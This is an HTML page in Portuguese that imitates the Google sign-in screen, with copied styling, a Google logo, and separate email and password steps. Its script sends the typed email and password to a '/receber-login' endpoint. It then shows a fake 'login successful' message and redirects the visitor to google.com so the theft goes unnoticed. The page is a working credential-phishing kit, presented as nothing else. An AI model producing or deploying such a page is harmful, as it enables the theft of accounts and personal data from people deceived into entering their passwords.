<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login nas Contas do Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        body {
            background: #fff;
            color: #202124;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        .header {
            padding: 24px 0;
            text-align: center;
            border-bottom: 1px solid #dadce0;
        }
        
        .google-logo {
            width: 75px;
            height: 24px;
        }
        
        /* Main Container */
        .container {
            max-width: 448px;
            margin: 0 auto;
            padding: 48px 40px 36px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .login-box {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }
        
        /* Title */
        .title {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .title h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 16px 0 8px;
        }
        
        .title p {
            font-size: 16px;
            color: #202124;
            font-weight: 400;
        }
        
        /* Form */
        .form-group {
            margin-bottom: 24px;
        }
        
        .input-field {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
        }
        
        .input-field:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .input-field.error {
            border-color: #d93025;
        }
        
        /* Password Field (hidden initially) */
        .password-field {
            display: none;
            margin-top: 16px;
        }
        
        /* Links */
        .forgot-email {
            display: block;
            text-align: left;
            margin-bottom: 26px;
        }
        
        .forgot-email a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-email a:hover {
            text-decoration: underline;
        }
        
        /* Info Text */
        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin: 32px 0 26px;
            line-height: 1.4286;
        }
        
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        
        .info-text a:hover {
            text-decoration: underline;
        }
        
        /* Buttons */
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .next-button:hover {
            background: #1669d6;
        }
        
        .next-button:disabled {
            background: #1a73e8;
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        /* Footer */
        .footer {
            padding: 24px 0;
            border-top: 1px solid #dadce0;
            margin-top: auto;
        }
        
        .footer-content {
            max-width: 448px;
            margin: 0 auto;
            padding: 0 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .language-select {
            border: none;
            background: none;
            color: #1a73e8;
            font-size: 12px;
            cursor: pointer;
            padding: 8px;
        }
        
        .footer-links {
            display: flex;
            gap: 24px;
        }
        
        .footer-links a {
            color: #757575;
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Result Message */
        .result {
            margin-top: 20px;
            padding: 16px;
            border-radius: 4px;
            font-size: 14px;
            display: none;
        }
        
        .result.success {
            background: #e6f4ea;
            border: 1px solid #34a853;
            color: #137333;
        }
        
        .result.error {
            background: #fce8e6;
            border: 1px solid #f28b82;
            color: #c5221f;
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 24px;
            }
            
            .login-box {
                border: none;
                padding: 24px 0;
            }
            
            .footer-content {
                flex-direction: column;
                gap: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <!-- Logo oficial do Google em SVG -->
        <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24">
            <path d="M67.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554zm-9.856-2.554h-3.008v2.533h3.008c1.318 0 2.386-.472 3.224-1.263l1.28 1.28c-1.165 1.165-2.645 1.785-4.504 1.785-3.039 0-5.18-2.039-5.18-4.949s2.141-4.949 5.18-4.949c1.86 0 3.339.62 4.504 1.785l-1.28 1.28c-.838-.79-1.906-1.263-3.224-1.263-1.86 0-3.339.62-4.504 1.785-.838.79-1.318 1.818-1.318 3.142s.48 2.352 1.318 3.142c1.165 1.165 2.645 1.785 4.504 1.785z" fill="#4285F4"/>
            <path d="M47.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554zm-9.856-2.554h-3.008v2.533h3.008c1.318 0 2.386-.472 3.224-1.263l1.28 1.28c-1.165 1.165-2.645 1.785-4.504 1.785-3.039 0-5.18-2.039-5.18-4.949s2.141-4.949 5.18-4.949c1.86 0 3.339.62 4.504 1.785l-1.28 1.28c-.838-.79-1.906-1.263-3.224-1.263-1.86 0-3.339.62-4.504 1.785-.838.79-1.318 1.818-1.318 3.142s.48 2.352 1.318 3.142c1.165 1.165 2.645 1.785 4.504 1.785z" fill="#34A853"/>
            <path d="M27.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554zm-9.856-2.554h-3.008v2.533h3.008c1.318 0 2.386-.472 3.224-1.263l1.28 1.28c-1.165 1.165-2.645 1.785-4.504 1.785-3.039 0-5.18-2.039-5.18-4.949s2.141-4.949 5.18-4.949c1.86 0 3.339.62 4.504 1.785l-1.28 1.28c-.838-.79-1.906-1.263-3.224-1.263-1.86 0-3.339.62-4.504 1.785-.838.79-1.318 1.818-1.318 3.142s.48 2.352 1.318 3.142c1.165 1.165 2.645 1.785 4.504 1.785z" fill="#FBBC05"/>
            <path d="M7.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554z" fill="#EA4335"/>
        </svg>
    </div>

    <!-- Main Content -->
    <div class="container">
        <div class="login-box">
            <div class="title">
                <h1>Fazer login</h1>
                <p>Use sua Conta do Google</p>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <input type="email" class="input-field" id="email" placeholder="E-mail ou telefone" required autofocus>
                </div>

                <div class="password-field" id="passwordField">
                    <input type="password" class="input-field" id="password" placeholder="Digite sua senha">
                </div>

                <a href="#" class="forgot-email" id="forgotEmail">Esqueceu seu e-mail?</a>

                <div class="info-text">
                    Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
                </div>

                <div class="buttons">
                    <a href="#" class="create-account">Criar conta</a>
                    <button type="submit" class="next-button" id="submitBtn">Próxima</button>
                </div>
            </form>

            <div class="result" id="result"></div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-content">
            <select class="language-select">
                <option>Português (Brasil)</option>
                <option>English (United States)</option>
                <option>Español (España)</option>
            </select>
            
            <div class="footer-links">
                <a href="#">Ajuda</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        const emailInput = document.getElementById('email');
        const passwordField = document.getElementById('passwordField');
        const forgotEmailLink = document.getElementById('forgotEmail');
        const submitBtn = document.getElementById('submitBtn');

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const email = emailInput.value;
            const password = document.getElementById('password').value;
            const result = document.getElementById('result');
            
            if (currentStep === 1) {
                // Primeiro passo: validar email
                if (!email.includes('@')) {
                    emailInput.classList.add('error');
                    return;
                }
                
                // Simular verificação do Google
                submitBtn.disabled = true;
                submitBtn.textContent = 'Verificando...';
                
                setTimeout(() => {
                    // Mostrar campo de senha
                    passwordField.style.display = 'block';
                    forgotEmailLink.textContent = 'Esqueceu a senha?';
                    submitBtn.textContent = 'Fazer login';
                    currentStep = 2;
                    submitBtn.disabled = false;
                    
                    // Focar no campo de senha
                    document.getElementById('password').focus();
                }, 1000);
                
            } else {
                // Segundo passo: enviar login
                submitBtn.disabled = true;
                submitBtn.textContent = 'Entrando...';
                result.style.display = 'none';
                
                try {
                    const response = await fetch('/receber-login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            senha: password
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (response.ok) {
                        result.className = 'result success';
                        result.innerHTML = `
                            <strong>✅ Login realizado com sucesso!</strong><br>
                            <small>Redirecionando para o Google...</small>
                        `;
                        result.style.display = 'block';
                        
                        // Simular redirecionamento do Google
                        setTimeout(() => {
                            window.location.href = 'https://google.com';
                        }, 2000);
                        
                    } else {
                        throw new Error(data.message || 'Erro no servidor');
                    }
                    
                } catch (error) {
                    result.className = 'result error';
                    result.innerHTML = `
                        <strong>❌ Senha incorreta. Tente novamente</strong><br>
                        <small>${error.message}</small>
                    `;
                    result.style.display = 'block';
                    
                    // Limpar senha e focar novamente
                    document.getElementById('password').value = '';
                    document.getElementById('password').focus();
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Fazer login';
                }
            }
        });

        // Remover erro quando usuário digitar
        emailInput.addEventListener('input', function() {
            this.classList.remove('error');
        });

        // Voltar para o primeiro passo se clicar em "Esqueceu a senha?"
        forgotEmailLink.addEventListener('click', function(e) {
            e.preventDefault();
            if (currentStep === 2) {
                passwordField.style.display = 'none';
                forgotEmailLink.textContent = 'Esqueceu seu e-mail?';
                submitBtn.textContent = 'Próxima';
                currentStep = 1;
                emailInput.focus();
            }
        });
    </script>
</body>
</html>
